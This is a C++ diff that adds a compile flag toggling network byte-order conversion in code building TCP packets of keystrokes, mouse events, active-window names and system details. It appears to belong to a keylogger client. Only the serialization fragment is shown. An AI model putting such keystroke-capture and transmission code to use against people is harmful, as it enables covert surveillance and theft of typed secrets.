@@ -247,10 +247,15 @@ namespace spider
       std::int32_t               rc = 1;
       network::tcp::PacketHeader header;
 
+#if defined SPIDER_SERIALIZE
 #if defined __linux__
       header.time = htobe64(msg.sys.time);
 #else
       header.time = htonll(msg.sys.time);
+#endif
+
+#else
+      header.time = msg.sys.time;
 #endif
       header.macAddress = msg.sys.mac;
       switch (msg.sys.type)
@@ -260,7 +265,11 @@ namespace spider
 	    network::tcp::PacketEvent event{};
 
 	    header.type = network::tcp::PacketType::KeyboardEvent;
+#if defined SPIDER_SERIALIZE
 	    event.key = htonl(msg.sys.event.key);
+#else
+	    event.key = msg.sys.event.key;
+#endif
 	    event.state = (msg.sys.event.state == SystemMsgEventState::Down)
 	                      ? network::tcp::PacketEventState::Down
 	                      : network::tcp::PacketEventState::Up;
@@ -281,7 +290,11 @@ namespace spider
 	    network::tcp::PacketEvent event;
 
 	    header.type = network::tcp::PacketType::MouseButton;
+#if defined SPIDER_SERIALIZE
 	    event.key = htonl(msg.sys.event.key);
+#else
+	    event.key = msg.sys.event.key;
+#endif
 	    event.state = (msg.sys.event.state == SystemMsgEventState::Down)
 	                      ? network::tcp::PacketEventState::Down
 	                      : network::tcp::PacketEventState::Up;
@@ -301,8 +314,13 @@ namespace spider
 	    network::tcp::PacketMov event;
 
 	    header.type = network::tcp::PacketType::MousePosition;
+#if defined SPIDER_SERIALIZE
 	    event.posX = htonl(msg.sys.event.posX);
 	    event.posY = htonl(msg.sys.event.posY);
+#else
+	    event.posX = msg.sys.event.posX;
+	    event.posY = msg.sys.event.posY;
+#endif
 	    event.processName = msg.sys.currentWindow;
 
 	    // Send packet
@@ -325,9 +343,8 @@ namespace spider
 	            msg.sys.data.raw);
 
 	    header.type = network::tcp::PacketType::Infos;
+#if defined SPIDER_SERIALIZE
 	    info.procArch = htons(static_cast<std::uint16_t>(infosPtr->pArch));
-	    info.arch = static_cast<std::uint8_t>(infosPtr->arch);
-	    info.os = static_cast<std::uint8_t>(infosPtr->os);
 	    info.pageSize = htonl(infosPtr->pageSize);
 	    info.nbProc = htons(infosPtr->nbProc);
 #if defined __linux__
@@ -335,6 +352,16 @@ namespace spider
 #else
 	    info.ram = htonll(infosPtr->ram);
 #endif
+
+#else
+	    info.procArch = static_cast<std::uint16_t>(infosPtr->pArch);
+	    info.pageSize = infosPtr->pageSize;
+	    info.nbProc = infosPtr->nbProc;
+	    info.ram = infosPtr->ram;
+#endif
+	    info.arch = static_cast<std::uint8_t>(infosPtr->arch);
+	    info.os = static_cast<std::uint8_t>(infosPtr->os);
+
 	    std::array<std::uint8_t, sizeof(header) + sizeof(info)> buff;
 	    std::memcpy(buff.data(), &header, sizeof(header));
 	    std::memcpy(buff.data() + sizeof(header), &info, sizeof(info));
